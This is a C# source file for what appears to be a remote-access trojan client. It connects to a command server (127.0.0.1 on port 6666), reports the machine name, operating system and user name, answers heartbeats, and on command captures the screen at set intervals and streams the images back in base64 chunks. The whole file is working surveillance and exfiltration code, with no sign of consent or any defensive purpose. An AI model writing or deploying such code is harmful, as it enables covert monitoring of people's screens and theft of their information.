using System;
using System.Net.Sockets;
using System.Text;
using System.Web.Script.Serialization;
using System.Timers;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Collections.Generic;

class Program
{
    static TcpClient client;
    static NetworkStream stream;
    static readonly string Server = "127.0.0.1";
    static readonly int Port = 6666;
    static System.Timers.Timer screenshotTimer;
    static Queue<string> screenshotChunks = new Queue<string>();
    static int bufferSize = 1024 * 5;
    static bool isSendingScreenshot = false;

    static void Main(string[] args)
    {
        try
        {
            client = new TcpClient(Server, Port);
            stream = client.GetStream();

            SendInfo();

            while (true)
            {
                byte[] data = new byte[bufferSize];
                int bytes = stream.Read(data, 0, data.Length);
                if (bytes == 0) break;
                string responseData = Encoding.UTF8.GetString(data, 0, bytes);
                dynamic responseJson = new JavaScriptSerializer().Deserialize<dynamic>(responseData);

                if (responseJson["type"] == "message")
                {
                    Console.WriteLine("Received: {0}", responseJson["text"]);
                }
                else if (responseJson["type"] == "heartbeat")
                {
                    SendHeartbeatResponse();
                }
                else if (responseJson["type"] == "set_interval")
                {
                    SetIntervalAndStartSendingScreenshots((int)responseJson["interval"]);
                }
                else if (responseJson["type"] == "stop_screenshots")
                {
                    StopSendingScreenshots();
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("Exception: {0}", e);
        }
        finally
        {
            if (stream != null) stream.Close();
            if (client != null) client.Close();
        }
    }
    static string GetPC()
    {
        return Environment.MachineName;
    }
    static Tuple<string, string> GetOS()
    {
        return new Tuple<string, string>(Environment.OSVersion.ToString(), Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit");
    }
    static string GetUser()
    {
        return Environment.UserName;
    }
    static void SendInfo()
    {
        var osInfo = GetOS();
        string pc = GetPC();
        string user = GetUser();

        var jsonOSInfo = new {
            type = "info",
            os = osInfo.Item1 + " " + osInfo.Item2,
            pc = pc,
            user = user
        };
        SendJson(jsonOSInfo);
    }
    static void SendMessage(string message)
    {
        var jsonMessage = new {
            type = "message",
            text = message
        };
        SendJson(jsonMessage);
    }
    static void SendHeartbeatResponse()
    {
        var heartbeatResponse = new
        {
            type = "heartbeat",
            text = "pong"
        };
        SendJson(heartbeatResponse);
    }
    static void SetIntervalAndStartSendingScreenshots(int interval)
    {
        screenshotTimer = new System.Timers.Timer(interval);
        screenshotTimer.Elapsed += (sender, e) => SendScreenshot();
        screenshotTimer.Start();
    }
    static void StopSendingScreenshots()
    {
        if (screenshotTimer != null)
        {
            screenshotTimer.Stop();
            screenshotTimer.Dispose();
            screenshotTimer = null;
            SendMessage("Stopped sending screenshots.");
        }
    }
    static void SendScreenshot()
    {
        if (isSendingScreenshot)
            return;

        isSendingScreenshot = true;
        screenshotChunks.Clear();

        var screenshot = CaptureScreen();
        string base64Screenshot = Convert.ToBase64String(screenshot);
        int chunkSize = CalculateMaxChunkSize();

        for (int i = 0; i < base64Screenshot.Length; i += chunkSize)
        {
            string chunk = base64Screenshot.Substring(i, Math.Min(chunkSize, base64Screenshot.Length - i));
            screenshotChunks.Enqueue(chunk);
        }
        SendNextScreenshotChunk();
    }
    static int CalculateMaxChunkSize()
    {
        var sampleMessage = new
        {
            type = "screenshot_chunk",
            data = "",
            final = false
        };
        string emptyJson = new JavaScriptSerializer().Serialize(sampleMessage);
        int jsonOverhead = Encoding.UTF8.GetByteCount(emptyJson);
        int maxDataSize = bufferSize - jsonOverhead;
        return maxDataSize * 3 / 4;
    }
    static void SendNextScreenshotChunk()
    {
        if (screenshotChunks.Count > 0)
        {
            string chunk = screenshotChunks.Dequeue();
            bool isFinal = screenshotChunks.Count == 0;
            var screenshotMessage = new
            {
                type = "screenshot_chunk",
                data = chunk,
                final = isFinal
            };
            SendJson(screenshotMessage);

            if (!isFinal)
            {
                Task.Delay(10).ContinueWith(t => SendNextScreenshotChunk());
            }
            else
            {
                isSendingScreenshot = false;
            }
        }
    }
    static byte[] CaptureScreen()
    {
        Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
        Graphics graphics = Graphics.FromImage(bitmap);
        graphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size);
        using (MemoryStream memoryStream = new MemoryStream())
        {
            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            return memoryStream.ToArray();
        }
    }
    static void SendJson(object jsonObject)
    {
        string jsonString = new JavaScriptSerializer().Serialize(jsonObject);
        byte[] data = Encoding.UTF8.GetBytes(jsonString);
        stream.Write(data, 0, data.Length);
    }
}